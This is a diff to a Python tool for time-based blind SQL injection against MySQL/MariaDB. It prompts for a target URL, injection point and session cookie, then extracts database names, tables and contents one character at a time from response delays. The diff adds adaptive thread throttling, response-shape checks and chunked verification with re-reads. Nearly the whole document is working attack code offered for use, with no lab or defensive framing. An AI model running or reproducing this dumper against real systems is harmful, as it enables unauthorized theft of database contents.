@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ---------------------------------------------------------------------------
-# Time-based blind SQLi dumper (MySQL) - interactive, auto-calibrating, threaded
+# Time-based blind SQLi dumper (MySQL/MariaDB) - interactive, self-calibrating
 # Oracle = RESPONSE TIME. A condition is wrapped so the DB sleeps when TRUE:
 # slow reply (>= threshold) = TRUE, instant reply = FALSE.
 #
@@ -13,6 +13,11 @@ import time
 import sys
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+_print_lock = threading.Lock()
+
+class OracleError(Exception):
+    """The target stopped giving answers we are allowed to believe."""
 
 # --- Interactive config ----------------------------------------------------
 print("=== time-based SQLi dumper ===")
@@ -38,12 +43,13 @@ COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() 
 COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()
 
 # Auto mode samples the target and derives DELAY from the measured jitter.
-# Enter a number instead to force a fixed value - use that when the box is
-# unstable enough that the sampling itself is unreliable.
+# Enter a number instead to force a fixed value.
 _delay_in    = input("SLEEP seconds on TRUE (y = auto, or a number): ").strip().lower()
 AUTO_DELAY   = _delay_in in ("", "y", "yes", "auto", "a")
-DELAY        = None if AUTO_DELAY else float(_delay_in)
-THREADS      = int(input("Threads (e.g. 8; lower if box is fragile)    : ").strip() or "8")
+DELAY        = 1.0 if AUTO_DELAY else float(_delay_in)
+# Starting concurrency only. It is reduced automatically if the box starts
+# erroring, so there is no penalty for guessing a bit high.
+THREADS      = int(input("Threads (e.g. 4; auto-reduced if box chokes) : ").strip() or "4")
 
 # Filled in by calibrate_timing(). THRESHOLD splits TRUE from FALSE; the gray
 # band around it marks readings too close to call, which get re-measured.
@@ -51,13 +57,36 @@ THRESHOLD    = None
 GRAY_LO      = None
 GRAY_HI      = None
 BASE_P95     = None
+REQ_TIMEOUT  = 20
 VERIFY_FORM  = None
+# Shape of a known-good reply. Any response outside this is not an answer.
+BASE_STATUS  = None
+BASE_LEN_LO  = None
+BASE_LEN_HI  = None
 
 # One session reused for every request (across all threads). The cookie (if
 # set) rides along automatically in the Cookie header on each request.
 SESSION = requests.Session()
 if COOKIE_VALUE:
     SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)
+
+# --- Adaptive concurrency gate ---------------------------------------------
+# ThreadPoolExecutor caps worker count, but the gate can be tightened at
+# runtime: permits are taken away when the target starts erroring and are
+# never handed back, so a box that chokes once is not hammered again.
+_gate = threading.Semaphore(THREADS)
+_gate_lock = threading.Lock()
+LIVE_PERMITS = THREADS
+
+def shrink_concurrency():
+    global LIVE_PERMITS
+    with _gate_lock:
+        if LIVE_PERMITS <= 1:
+            return False
+        if _gate.acquire(blocking=False):
+            LIVE_PERMITS -= 1
+            return True
+    return False
 
 # --- Wrapper forms tried during calibration (first that fires wins) --------
 # Each turns a boolean {cond} into "sleep DELAY seconds iff cond is TRUE".
@@ -72,88 +101,145 @@ WRAPPERS = [
 
 # --- Request sender (GET -> query, POST -> body, HEADER -> header) ----------
 # Runs over SESSION so the cookie is attached when one was provided. The
-# session's connection pool is thread-safe for concurrent requests, and here
-# the cookie jar is only read (never mutated mid-run), so sharing one session
-# across the thread pool is safe.
+# session's connection pool is thread-safe, and the cookie jar is only read
+# (never mutated mid-run), so sharing one session across threads is safe.
 def send(payload):
-    if METHOD == "HEADER":
-        return SESSION.get(URL, headers={INJ_FIELD: payload})
-    if METHOD == "GET":
-        params = {INJ_FIELD: payload}
+    with _gate:
+        if METHOD == "HEADER":
+            return SESSION.get(URL, headers={INJ_FIELD: payload}, timeout=REQ_TIMEOUT)
+        if METHOD == "GET":
+            params = {INJ_FIELD: payload}
+            if OTHER_FIELD:
+                params[OTHER_FIELD] = OTHER_VALUE
+            return SESSION.get(URL, params=params, timeout=REQ_TIMEOUT)
+        data = {INJ_FIELD: payload}
         if OTHER_FIELD:
-            params[OTHER_FIELD] = OTHER_VALUE
-        return SESSION.get(URL, params=params)
-    data = {INJ_FIELD: payload}
-    if OTHER_FIELD:
-        data[OTHER_FIELD] = OTHER_VALUE
-    return SESSION.post(URL, data=data)
+            data[OTHER_FIELD] = OTHER_VALUE
+        return SESSION.post(URL, data=data, timeout=REQ_TIMEOUT)
 
 def build(cond, wrapper):
     return TEMPLATE.replace("[INJECT]", wrapper.format(cond=cond, d=DELAY))
 
-def timed(cond, wrapper):
-    start = time.time()
-    send(build(cond, wrapper))
-    return time.time() - start
+def set_delay(d):
+    """Set DELAY and rebuild every threshold derived from it."""
+    global DELAY, THRESHOLD, GRAY_LO, GRAY_HI, REQ_TIMEOUT
+    DELAY       = round(d, 2)
+    THRESHOLD   = BASE_P95 + DELAY * 0.5
+    GRAY_LO     = BASE_P95 + DELAY * 0.3
+    GRAY_HI     = BASE_P95 + DELAY * 0.7
+    REQ_TIMEOUT = DELAY * 3 + 10
 
 # --- Timing calibration: measure the noise floor, then size DELAY to it -----
-# Samples are taken at the real THREADS concurrency, because a box that is
-# calm single-threaded can be much noisier once the pool is hammering it.
-# The no-op payload splices 0 in place of [INJECT], so it is valid in every
-# context and never sleeps - it measures pure round-trip time.
+# Samples are taken at the real thread count, because a box that is calm
+# single-threaded can be much noisier once the pool is hammering it. The no-op
+# payload splices 0 in place of [INJECT], so it is valid in every context and
+# never sleeps - it measures pure round-trip time and records what a good
+# reply looks like.
 def sample_baseline(n):
     payload = TEMPLATE.replace("[INJECT]", "0")
     def one(_):
         start = time.time()
         try:
-            send(payload)
+            r = send(payload)
         except Exception:
             return None
-        return time.time() - start
-    samples = []
+        return (time.time() - start, r.status_code, len(r.content))
+    out = []
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
         for r in ex.map(one, range(n)):
             if r is not None:
-                samples.append(r)
-    return sorted(samples)
+                out.append(r)
+    return out
 
 def calibrate_timing():
-    global DELAY, THRESHOLD, GRAY_LO, GRAY_HI, BASE_P95
-    n = max(12, THREADS * 2)
-    print(f"\n[*] Sampling baseline RTT ({n} requests at {THREADS} threads)...")
-    s = sample_baseline(n)
-    if len(s) < 4:
+    global BASE_P95, BASE_STATUS, BASE_LEN_LO, BASE_LEN_HI
+    n = max(12, THREADS * 3)
+    print(f"\n[*] Sampling baseline ({n} requests at {THREADS} threads)...")
+    res = sample_baseline(n)
+    if len(res) < 4:
         print("[!] Baseline sampling failed (target unreachable?). Aborting.")
         sys.exit(1)
-    med = s[len(s) // 2]
-    p95 = s[min(len(s) - 1, int(len(s) * 0.95))]
+    times = sorted(r[0] for r in res)
+    statuses = [r[1] for r in res]
+    lengths = [r[2] for r in res]
+    med = times[len(times) // 2]
+    p95 = times[min(len(times) - 1, int(len(times) * 0.95))]
     # Jitter is the spread above the median, floored so a suspiciously quiet
     # sample run cannot collapse DELAY to something unusable.
     jitter = max(p95 - med, 0.05)
+    BASE_P95     = p95
+    BASE_STATUS  = max(set(statuses), key=statuses.count)
+    BASE_LEN_LO  = min(lengths) - 64
+    BASE_LEN_HI  = max(lengths) + 64
     if AUTO_DELAY:
-        DELAY = round(max(0.5, 4 * jitter), 2)
-    # A TRUE lands near p95 + DELAY, a FALSE at or below p95. Split the gap.
-    BASE_P95  = p95
-    THRESHOLD = p95 + DELAY * 0.5
-    GRAY_LO   = p95 + DELAY * 0.3
-    GRAY_HI   = p95 + DELAY * 0.7
+        set_delay(max(0.5, 4 * jitter))
+    else:
+        set_delay(DELAY)
     print(f"[+] baseline: median {med:.3f}s  p95 {p95:.3f}s  jitter {jitter:.3f}s")
+    print(f"[+] good reply = HTTP {BASE_STATUS}, body {max(0,BASE_LEN_LO)}-{BASE_LEN_HI} bytes")
     print(f"[+] DELAY {DELAY:.2f}s ({'auto' if AUTO_DELAY else 'manual'})  "
           f"threshold {THRESHOLD:.3f}s  gray band {GRAY_LO:.3f}-{GRAY_HI:.3f}s")
+
+# --- The measurement, and the answer built on top of it --------------------
+def measure(condition):
+    """Time one request. Returns elapsed seconds, or None when the reply does
+    not look like a real answer - an error page is fast, and scoring that as
+    FALSE is exactly how a dump turns into garbage."""
+    start = time.time()
+    try:
+        r = send(build(condition, CHOSEN))
+    except Exception:
+        return None
+    elapsed = time.time() - start
+    if r.status_code != BASE_STATUS:
+        return None
+    if not (BASE_LEN_LO <= len(r.content) <= BASE_LEN_HI):
+        return None
+    return elapsed
+
+def oracle(condition):
+    """One boolean question. A reading outside the gray band is decisive;
+    inside it is noise, so re-measure and take the majority. Invalid replies
+    are retried with backoff and pull concurrency down as they accumulate."""
+    invalid = 0
+    ambiguous = []
+    while True:
+        elapsed = measure(condition)
+        if elapsed is None:
+            invalid += 1
+            if invalid % 3 == 0 and shrink_concurrency():
+                with _print_lock:
+                    print(f"\n[!] Target erroring under load - concurrency "
+                          f"reduced to {LIVE_PERMITS}.")
+            if invalid >= 12:
+                raise OracleError("target stopped returning valid responses")
+            time.sleep(min(2.0, 0.15 * invalid))
+            continue
+        if elapsed >= GRAY_HI:
+            return True
+        if elapsed <= GRAY_LO:
+            return False
+        ambiguous.append(elapsed)
+        if len(ambiguous) >= 3:
+            votes = sum(1 for e in ambiguous if e >= THRESHOLD)
+            return votes * 2 > len(ambiguous)
 
 # --- Calibration: pick the wrapper that actually delays --------------------
 CHOSEN = None
 def calibrate_wrapper():
     global CHOSEN
     for w in WRAPPERS:
+        CHOSEN = w
         try:
-            true_slow  = timed("1=1", w) >= THRESHOLD   # TRUE must sleep
-            false_fast = timed("1=2", w) <  THRESHOLD   # FALSE must not
+            t_true  = measure("1=1")
+            t_false = measure("1=2")
         except Exception:
             continue
-        if true_slow and false_fast:
-            CHOSEN = w
+        if t_true is None or t_false is None:
+            continue
+        if t_true >= THRESHOLD and t_false < THRESHOLD:
             return w
+    CHOSEN = None
     return None
 
 calibrate_timing()
@@ -165,10 +251,7 @@ for attempt in range(3):
     if calibrate_wrapper():
         break
     if attempt < 2 and AUTO_DELAY:
-        DELAY = round(DELAY * 2, 2)
-        THRESHOLD = BASE_P95 + DELAY * 0.5
-        GRAY_LO   = BASE_P95 + DELAY * 0.3
-        GRAY_HI   = BASE_P95 + DELAY * 0.7
+        set_delay(DELAY * 2)
         print(f"[*] No wrapper fired - raising DELAY to {DELAY:.2f}s and retrying...")
 if not CHOSEN:
     print("[!] No wrapper fired. TRUE never delayed or FALSE also delayed.")
@@ -176,7 +259,6 @@ if not CHOSEN:
     print("    - HEADER values must use real spaces, never + or %20.")
     print("    - If the endpoint needs auth, check the cookie name/value.")
     print("    - The parameter may simply not be injectable here.")
-    print("    - If the box is heavily loaded, rerun and set DELAY manually.")
     print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
     print(f"    delay    = {DELAY}s, threshold = {THRESHOLD:.3f}s")
@@ -184,34 +266,15 @@ if not CHOSEN:
     sys.exit(1)
 print(f"[+] Using wrapper: {CHOSEN}\n")
 
-# MySQL system schemas to skip when dumping "all" (still listed on screen)
+# MySQL/MariaDB system schemas to skip when dumping "all" (still listed)
 SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
-# --- Core oracle + extraction ----------------------------------------------
-def oracle(condition, tries=3):
-    """One boolean question -> True if the reply was delayed.
-    A reading outside the gray band is decisive and returns immediately.
-    Anything inside it is noise, so re-measure and take the majority."""
-    votes = 0
-    seen = 0
-    for _ in range(tries):
-        start = time.time()
-        send(build(condition, CHOSEN))
-        elapsed = time.time() - start
-        if elapsed >= GRAY_HI:
-            return True
-        if elapsed <= GRAY_LO:
-            return False
-        seen += 1
-        if elapsed >= THRESHOLD:
-            votes += 1
-    return votes * 2 > seen
-
+# --- Character extraction ---------------------------------------------------
 # Cheap probes run before any binary search. FALSE costs one RTT, TRUE costs a
 # full DELAY, so each probe is phrased so the likely answer is FALSE - except
 # the comma, which is worth one direct hit because group_concat output is full
 # of them and it resolves the byte in a single question.
-FAST_SINGLES = [44]                          # ,
+FAST_SINGLES = [44]                              # ,
 FAST_RANGES  = [(97, 122), (48, 57), (65, 90)]   # a-z, 0-9, A-Z
 
 def bsearch(expr, lo, hi):
@@ -248,59 +311,103 @@ def get_length(subquery):
             hi = mid
     return lo
 
-# --- Integrity check + repair ----------------------------------------------
-# One question confirms a whole segment, so a bad byte anywhere is caught for
-# the price of a single sleep. The compare uses a bare 0x hex literal, so no
-# quotes ever enter the payload and nothing depends on how the app escapes
-# them. CAST(... AS BINARY) forces a byte-exact compare; the BINARY operator
-# is deprecated since MySQL 8.0.28 and gone in 8.4, so it is only a fallback.
+# --- Verification -----------------------------------------------------------
+# One question confirms a whole chunk, so a bad byte anywhere in it costs a
+# single sleep to find. The compare uses a bare 0x hex literal, so no quotes
+# ever enter the payload and nothing depends on how the app escapes them.
+# CAST(... AS BINARY) forces a byte-exact compare; the BINARY operator is
+# deprecated since MySQL 8.0.28 and gone in 8.4, so it is not used at all.
+CHUNK = 24
 VERIFY_FORMS = [
     "CAST(substring(({sub}),{start},{n}) AS BINARY)=0x{h}",
     "substring(({sub}),{start},{n})=0x{h}",
 ]
 
 def segment_ok(subquery, buf, lo, hi):
-    """None means the check itself is unavailable, not that the bytes differ."""
+    """None means the check is unavailable, not that the bytes differ."""
     if VERIFY_FORM is None:
         return None
     h = bytes(buf[lo:hi]).hex()
     return oracle(VERIFY_FORM.format(sub=subquery, start=lo + 1, n=hi - lo, h=h))
 
-def _fix(subquery, buf, lo, hi):
-    if segment_ok(subquery, buf, lo, hi):
-        return 0
-    if hi - lo == 1:
-        v = bsearch(f"ascii(substring(({subquery}),{lo+1},1))", 0, 255)
-        # A re-read of 0 means every probe came back FALSE, which is what a
-        # dead oracle looks like - not a real NUL byte. Keep what we had.
-        if v:
-            buf[lo] = v
-        return 1
-    mid = (lo + hi) // 2
-    return _fix(subquery, buf, lo, mid) + _fix(subquery, buf, mid, hi)
-
-def repair(subquery, buf):
-    """Verify the dump against the DB; bisect to any bad byte and re-read it.
-    If the checker claims a large share of the string is wrong, the checker
-    itself is broken, so the original read is restored untouched rather than
-    overwritten. Returns (ok, bytes_fixed) where ok may be None = not checked."""
-    global VERIFY_FORM
+def bad_chunks(subquery, buf, positions, workers):
+    """Check every chunk covering the given positions, in parallel.
+    Returns the ranges that did not match."""
     if VERIFY_FORM is None:
-        return None, 0
-    original = list(buf)
-    budget = max(4, len(buf) // 4)
-    fixed = 0
-    for _ in range(3):
-        if segment_ok(subquery, buf, 0, len(buf)):
-            return True, fixed
-        fixed += _fix(subquery, buf, 0, len(buf))
-        if fixed > budget:
-            buf[:] = original
-            VERIFY_FORM = None
-            print(f"\n[!] Verification claimed {fixed}/{len(buf)} bytes bad - "
-                  f"the check is unreliable on this target, disabling it.")
-            return None, 0
-    return segment_ok(subquery, buf, 0, len(buf)), fixed
+        return []
+    ranges = sorted({(i // CHUNK * CHUNK,
+                      min(i // CHUNK * CHUNK + CHUNK, len(buf)))
+                     for i in positions})
+    bad = []
+    lock = threading.Lock()
+    def check(rng):
+        if segment_ok(subquery, buf, rng[0], rng[1]) is False:
+            with lock:
+                bad.append(rng)
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        list(ex.map(check, ranges))
+    return sorted(bad)
+
+# --- String extraction ------------------------------------------------------
+def dump_positions(subquery, buf, positions, workers, label, total):
+    """Read the given positions in parallel. Bytes are stored as ints so a
+    failed read can never shorten the buffer and shift everything after it."""
+    done = total - len(positions)
+    def work(i):
+        buf[i] = extract_char(subquery, i + 1)
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        futures = [ex.submit(work, i) for i in positions]
+        for f in as_completed(futures):
+            f.result()
+            if label is not None:
+                done += 1
+                with _print_lock:
+                    sys.stdout.write(f"\r{label}{done}/{total} chars")
+                    sys.stdout.flush()
+
+def extract_string(subquery, label=None):
+    """Read the string, verify it, and re-read only what failed. Each retry
+    round halves concurrency and lengthens DELAY, because a chunk that failed
+    almost always failed because the box was struggling at that moment."""
+    n = get_length(subquery)
+    if n == 0:
+        if label is not None:
+            sys.stdout.write(f"{label}\n")
+        return ""
+    buf = [0] * n
+    workers = max(1, LIVE_PERMITS)
+    todo = list(range(n))
+    reread = 0
+    status = None
+    for _ in range(4):
+        dump_positions(subquery, buf, todo, workers, label, n)
+        if VERIFY_FORM is None:
+            status = None
+            break
+        bad = bad_chunks(subquery, buf, todo, workers)
+        if not bad:
+            status = True
+            break
+        todo = [i for lo, hi in bad for i in range(lo, hi)]
+        reread += len(todo)
+        status = False
+        workers = max(1, workers // 2)
+        set_delay(DELAY * 1.5)
+        if label is not None:
+            with _print_lock:
+                sys.stdout.write(f"\r{label}{len(todo)} bytes failed the check"
+                                 f" - rereading at {workers} threads, "
+                                 f"DELAY {DELAY:.2f}s\n")
+                sys.stdout.flush()
+    s = bytes(buf).decode("utf-8", "replace")
+    if label is not None:
+        note = f"  [reread {reread}]" if reread else ""
+        if status is None:
+            note += "  [unverified]"
+        elif status is False:
+            note += "  [STILL MISMATCHED - treat as unreliable]"
+        sys.stdout.write(f"\r{label}{s}{note}{' ' * 8}\n")
+    return s
 
 # --- End-to-end self test --------------------------------------------------
 # Dumps a constant whose value is already known, so a silent oracle failure
@@ -325,8 +432,8 @@ def self_test():
     return True
 
 def calibrate_verify():
-    """Pick a compare form that actually works here, or switch verification
-    off. A checker that always says 'mismatch' is worse than none at all."""
+    """Pick a compare form that works here, or switch verification off. A
+    checker that always says 'mismatch' is worse than no checker."""
     global VERIFY_FORM
     for form in VERIFY_FORMS:
         VERIFY_FORM = form
@@ -339,42 +446,6 @@ def calibrate_verify():
     VERIFY_FORM = None
     print("[!] No verification form worked - dumps will be marked [unverified].")
     return False
-
-_print_lock = threading.Lock()
-def extract_string(subquery, label=None):
-    """Find the length, then dump every character position in parallel.
-    Threads make time-based practical; order is restored by index. Bytes are
-    kept as ints so a failed read can never shorten the buffer and shift
-    everything after it - the old silent-drop failure mode."""
-    n = get_length(subquery)
-    if n == 0:
-        if label is not None:
-            sys.stdout.write(f"{label}\n")
-        return ""
-    buf = [0] * n
-    done = 0
-    def work(i):
-        buf[i] = extract_char(subquery, i + 1)
-    with ThreadPoolExecutor(max_workers=THREADS) as ex:
-        futures = {ex.submit(work, i): i for i in range(n)}
-        for _ in as_completed(futures):
-            if label is not None:
-                done += 1
-                with _print_lock:
-                    sys.stdout.write(f"\r{label}{done}/{n} chars")
-                    sys.stdout.flush()
-    ok, fixed = repair(subquery, buf)
-    s = bytes(buf).decode("utf-8", "replace")
-    if label is not None:
-        note = ""
-        if fixed:
-            note = f"  [repaired {fixed}]"
-        if ok is None:
-            note += "  [unverified]"
-        elif ok is False:
-            note += "  [MISMATCH - rerun with fewer threads]"
-        sys.stdout.write(f"\r{label}{s}{note}{' ' * 8}\n")
-    return s
 
 # --- ASCII table renderer --------------------------------------------------
 def render_table(headers, rows):
@@ -472,14 +543,14 @@ if __name__ == "__main__":
         print("[*] Running end-to-end self test...")
         if not self_test():
             print("[!] The oracle is not returning reliable answers, so any")
-            print("    dump would be silently wrong. Things to try:")
-            print("    - lower the thread count (the box may drop or error")
-            print("      out on concurrent sleeping queries)")
-            print("    - set DELAY manually instead of auto")
-            print("    - confirm the payload template really breaks out")
+            print("    dump would be silently wrong. Try fewer threads, or")
+            print("    set DELAY manually instead of auto.")
             sys.exit(1)
         calibrate_verify()
         print()
         main()
+    except OracleError as e:
+        print(f"\n[!] Aborted: {e}.")
+        print("    The box stopped answering - rerun with fewer threads.")
     except KeyboardInterrupt:
         print("\n[!] Interrupted.")
